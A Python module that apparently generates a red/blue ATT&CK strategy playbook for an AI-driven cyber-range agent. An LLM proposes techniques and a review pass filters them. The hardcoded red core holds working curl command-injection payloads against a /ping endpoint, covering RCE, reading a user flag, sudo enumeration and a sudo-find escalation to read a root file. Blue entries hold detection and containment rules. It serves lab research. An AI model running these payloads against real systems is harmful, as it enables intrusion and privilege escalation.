"""Initial STRATEGY PLAYBOOK generator (a SEPARATE LLM pass, reviewed).

A dedicated LLM proposes ATT&CK-based Red and Blue strategy candidates for the command-injection
range, then a REVIEW pass validates/repairs them. The result feeds the low-level Action-MCTS as
its action candidates + initial action priors (and blue detection strategies).

Red playbook per technique : objective, preconditions, executable command, success/failure
                             criteria, alternative actions, recovery path, prior.
Blue playbook per technique: attack indicators, detection conditions, response/containment,
                             defense rule candidate, service-availability condition, prior.

Saved to dataset/strategy_playbook.json. The command fields are concrete /ping command-injection
curls (the range's real RCE surface) so the actions are genuinely executable; a small guaranteed
core (recon -> RCE -> user flag -> privesc -> root exfil) is always ensured after review so the
Action-MCTS always has a working path to learn from, while the LLM adds breadth around it.
"""
from __future__ import annotations
import os
import re
import json
from pathlib import Path

PORT = 8080
_OUT = Path(__file__).resolve().parent / "dataset" / "strategy_playbook.json"

# Guaranteed-executable CORE (so the playbook always has a working kill chain to learn on). The
# LLM adds breadth; the review pass keeps anything valid and always merges this core back in.
_CORE_RED = {
    "T1595.002": {"name": "Active Scanning: Vulnerability Scanning", "tactics": ["reconnaissance"],
                  "objective": "probe the /ping endpoint for the injection surface",
                  "command": "curl -s 'http://{TARGET}:%d/ping?host=127.0.0.1'" % PORT,
                  "success_criteria": "HTTP 200 with ping output", "failure_criteria": "no response",
                  "preconditions": [], "alternatives": ["T1046"], "recovery": ["retry with -m 10"],
                  "prior": 0.5},
    "T1190": {"name": "Exploit Public-Facing Application", "tactics": ["initial-access"],
              "objective": "confirm command-injection RCE (initial access)",
              "command": "curl -s -G 'http://{TARGET}:%d/ping' --data-urlencode \"host=127.0.0.1;id\"" % PORT,
              "success_criteria": "output contains uid=", "failure_criteria": "no uid= / 'invalid host'",
              "preconditions": ["reconnaissance"], "alternatives": ["T1059.004"],
              "recovery": ["try alternate injection separators | $() `"], "prior": 0.6},
    "T1059.004": {"name": "Command and Scripting Interpreter: Unix Shell", "tactics": ["execution"],
                  "objective": "run an arbitrary shell command via the RCE",
                  "command": "curl -s -G 'http://{TARGET}:%d/ping' --data-urlencode \"host=127.0.0.1;uname -a\"" % PORT,
                  "success_criteria": "output contains Linux kernel string", "failure_criteria": "blocked",
                  "preconditions": ["initial-access"], "alternatives": ["T1059.006"],
                  "recovery": ["switch interpreter"], "prior": 0.55},
    "T1552.001": {"name": "Unsecured Credentials: Credentials In Files", "tactics": ["collection"],
                  "objective": "read the user flag /home/ctf/user.txt",
                  "command": "curl -s -G 'http://{TARGET}:%d/ping' --data-urlencode \"host=127.0.0.1;cat /home/ctf/user.txt\"" % PORT,
                  "success_criteria": "user flag token present", "failure_criteria": "empty/blocked",
                  "preconditions": ["execution"], "alternatives": ["T1005"],
                  "recovery": ["enumerate /home first (T1083)"], "prior": 0.6},
    "T1548.003": {"name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
                  "tactics": ["privilege-escalation"],
                  "objective": "enumerate the NOPASSWD sudo-find privesc",
                  "command": "curl -s -G 'http://{TARGET}:%d/ping' --data-urlencode \"host=127.0.0.1;sudo -n -l\"" % PORT,
                  "success_criteria": "NOPASSWD: /usr/bin/find listed", "failure_criteria": "no sudo rights",
                  "preconditions": ["execution"], "alternatives": ["T1083.001"],
                  "recovery": ["search SUID binaries"], "prior": 0.6},
    "T1041": {"name": "Exfiltration Over C2 Channel", "tactics": ["exfiltration"],
              "objective": "escalate via sudo-find and exfiltrate the root flag",
              "command": "curl -s -G 'http://{TARGET}:%d/ping' --data-urlencode \"host=127.0.0.1;sudo -n find /etc/hostname -exec cat /root/root.txt \\;\"" % PORT,
              "success_criteria": "root flag token present", "failure_criteria": "empty/blocked",
              "preconditions": ["privilege-escalation"], "alternatives": ["T1005"],
              "recovery": ["retry via alternate -exec target"], "prior": 0.65},
}
_CORE_BLUE = {
    "T1190": {"name": "Detect/contain command injection on /ping", "tactics": ["initial-access"],
              "indicators": ["inj=1 in /var/log/shell-target/cmd.log", "shell metacharacters in host param"],
              "detection_conditions": ["Wazuh rule 100714/100710 (T1190) fires"],
              "response": "enable input-sanitiser hot patch", "containment": "touch /var/lib/shell-target/patched",
              "detection_strategies": [{"name": "host command-audit monitoring"}],
              "availability_conditions": ["benign /ping still returns ping output"], "prior": 0.6},
    "T1548.003": {"name": "Detect/contain sudo-find privesc", "tactics": ["privilege-escalation"],
                  "indicators": ["sudo / find -exec in cmd.log"],
                  "detection_conditions": ["Wazuh rule 100711 (T1548.003) fires"],
                  "response": "revoke the ctf sudoers drop-in", "containment": "rm -f /etc/sudoers.d/ctf",
                  "detection_strategies": [{"name": "privilege-escalation monitoring"}],
                  "availability_conditions": ["service stays up; only sudo rule removed"], "prior": 0.6},
}

_TID_RE = re.compile(r"^T\d{4}(\.\d{3})?$")


def _llm_propose(llm, role: str, target_token: str = "{TARGET}") -> dict:
    """One generation pass: ask the LLM for extra ATT&CK techniques (breadth) in strict JSON."""
    if llm is None or not getattr(llm, "available", False):
        return {}
    if role == "red":
        schema = ('{"<ATT&CK id>": {"name","tactics":[kill-chain stage],"objective",'
                  '"command":"curl ... /ping ... injection using '+target_token+'",'
                  '"success_criteria","failure_criteria","preconditions":[],"alternatives":[],'
                  '"recovery":[],"prior":0..1}}')
        goal = ("Red attack techniques against a Linux box whose GET /ping?host= is "
                "COMMAND-INJECTABLE (RCE). Every command MUST be a curl to /ping with an injected "
                "shell payload. Cover recon, initial-access, execution, discovery, credential-access, "
                "privilege-escalation, exfiltration.")
    else:
        schema = ('{"<ATT&CK id>": {"name","tactics":[stage],"indicators":[],'
                  '"detection_conditions":[],"response","containment","detection_strategies":[{"name"}],'
                  '"availability_conditions":[],"prior":0..1}}')
        goal = ("Blue detection+containment techniques for that same command-injection host: how to "
                "DETECT each attack in the Wazuh logs and CONTAIN it with a TARGETED, "
                "availability-preserving mitigation (no service stop, no blanket block).")
    system = (f"You are a SEPARATE strategy planner building an ATT&CK-based {role.upper()} playbook. "
              f"{goal} Return ONLY a JSON object mapping real MITRE ATT&CK IDs to entries of the form "
              f"{schema}. 6-12 entries. No prose.")
    text = llm.complete("Produce the JSON playbook now.", system=system) or ""
    return _extract_json(text)


def _extract_json(text: str) -> dict:
    m = re.search(r"\{.*\}", text or "", re.DOTALL)
    blob = m.group(0) if m else (text or "")
    try:
        d = json.loads(blob)
        return d if isinstance(d, dict) else {}
    except Exception:
        pass
    try:
        import json_repair
        d = json_repair.loads(blob)
        return d if isinstance(d, dict) else {}
    except Exception:
        return {}


def _review(role: str, proposed: dict) -> dict:
    """REVIEW pass: keep only entries with a valid ATT&CK id + the required fields; for red, require
    an executable /ping-injection command (the real surface). Drops malformed/non-executable ideas."""
    ok = {}
    for tid, info in (proposed or {}).items():
        if not isinstance(info, dict) or not _TID_RE.match(str(tid).strip()):
            continue
        info = dict(info)
        info.setdefault("tactics", [])
        if not info.get("tactics"):
            continue
        if role == "red":
            cmd = (info.get("command") or "")
            if ("/ping" not in cmd) or not any(c in cmd for c in (";", "|", "$(", "`")):
                continue                      # not an executable injection against the surface
            info.setdefault("success_criteria", ""); info.setdefault("failure_criteria", "")
            info.setdefault("preconditions", []); info.setdefault("alternatives", [])
            info.setdefault("recovery", [])
        else:
            info.setdefault("detection_strategies", [{"name": "monitoring"}])
            info.setdefault("indicators", []); info.setdefault("detection_conditions", [])
            info.setdefault("response", ""); info.setdefault("containment", "")
            info.setdefault("availability_conditions", [])
        try:
            info["prior"] = float(info.get("prior", 0.5))
        except Exception:
            info["prior"] = 0.5
        ok[str(tid).strip()] = info
    return ok


def generate_playbook(llm=None, save: bool = True) -> dict:
    """Generate (LLM) + review + merge the guaranteed core -> the strategy playbook."""
    red = _review("red", _llm_propose(llm, "red"))
    blue = _review("blue", _llm_propose(llm, "blue"))
    # always merge the guaranteed-executable core back in (core wins on id clash -> known-good cmd)
    red = {**red, **_CORE_RED}
    blue = {**blue, **_CORE_BLUE}
    pb = {"range": "shell-command-injection", "port": PORT, "red": red, "blue": blue,
          "counts": {"red": len(red), "blue": len(blue)}}
    if save:
        _OUT.parent.mkdir(parents=True, exist_ok=True)
        _OUT.write_text(json.dumps(pb, ensure_ascii=False, indent=2))
        print(f"[playbook] saved {_OUT} : red={len(red)} blue={len(blue)} techniques")
    return pb


def load_playbook(target_ip: str) -> dict:
    """Load the saved playbook and bind {TARGET} -> target_ip. Returns dict with red/blue memories
    shaped for the Action-MCTS: {tech_id: {name,tactics,command,detection_strategies,prior,...}}."""
    pb = json.loads(_OUT.read_text())
    for role in ("red", "blue"):
        for tid, info in pb[role].items():
            if info.get("command"):
                info["command"] = info["command"].replace("{TARGET}", target_ip)
    return pb


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="Generate the initial ATT&CK strategy playbook")
    ap.add_argument("--no-llm", action="store_true", help="core only (no LLM breadth)")
    a = ap.parse_args()
    llm = None
    if not a.no_llm:
        try:
            import pipeline as P
            llm = P.get_llm() if P.get_llm is not None else None
        except Exception as e:
            print(f"[playbook] LLM unavailable ({e}); core-only")
    pb = generate_playbook(llm=llm)
    print("RED techniques:", ", ".join(sorted(pb["red"])))
    print("BLUE techniques:", ", ".join(sorted(pb["blue"])))
